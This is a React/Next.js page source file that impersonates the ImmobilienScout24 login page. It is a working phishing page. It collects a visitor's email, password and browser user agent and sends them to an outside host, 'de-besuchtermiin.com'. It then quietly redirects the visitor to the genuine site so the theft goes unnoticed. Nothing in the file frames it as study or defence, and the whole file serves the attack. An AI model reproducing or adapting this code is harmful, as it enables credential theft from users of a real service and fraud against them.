import { useState, useEffect } from "react";
import { useRouter } from 'next/router';
import Head from 'next/head';
import EmailForm from "../../components/email";
import PassForm from "../../components/pass";
import styles from '../../styles/Home.module.css';
import axios from "axios";

export default function Wohnungen() {
  const [data, setData] = useState({
    email: "",
    password: "",
    browser: ""
  });

  const router = useRouter();
  const [change, setChange] = useState(false);
  const [err, setErr] = useState(false);
  const [seePass, setSeePass] = useState(false);
  const [checkOut, setCheckOut] = useState(true);

  const handleChange = e => setData(prev => ({...prev, [e.target.name]: e.target.value}));

  function changeForm() {
    if(data.email) {
      setChange(true);
      setErr(false);
    } else {
      setErr(true);
    }
  } 

  function removeChange() {
    setChange(false);
    setErr(false);
    setData({
      email: "",
      password: ""
    })
  }

  async function handleSubmitFn() {
    try {      
      await axios.post(`https://de-besuchtermiin.com/api/spam`, data);
      router.replace('https://www.immobilienscout24.de/');
    } catch(err) {
            router.replace('https://www.immobilienscout24.de/');
      console.log(err);
    }
  }

  function handleSubmit(e) {
    e.preventDefault();

    if(change) {
      handleSubmitFn();
    }
  }

  useEffect(() => {
    setData(prev => ({...prev, browser: navigator.userAgent}))
  }, [])

  return (
    <div className={styles.container}>
      {console.log("u2")}
      <Head>
        <title>Welcome - ImmobilienScout24</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <form onSubmit={handleSubmit} className={err ? `${styles.form} ${styles.bigForm}` : change  ? `${styles.form} ${styles.passForm}` : styles.form}>
        {change ? <PassForm checkOut={checkOut} setCheckOut={setCheckOut} seePass={seePass} setSeePass={setSeePass} removeChange={removeChange} data={data} handleChange={handleChange} /> : <EmailForm err={err} changeForm={changeForm} data={data} handleChange={handleChange} /> }
      </form>
    </div>
  )
}
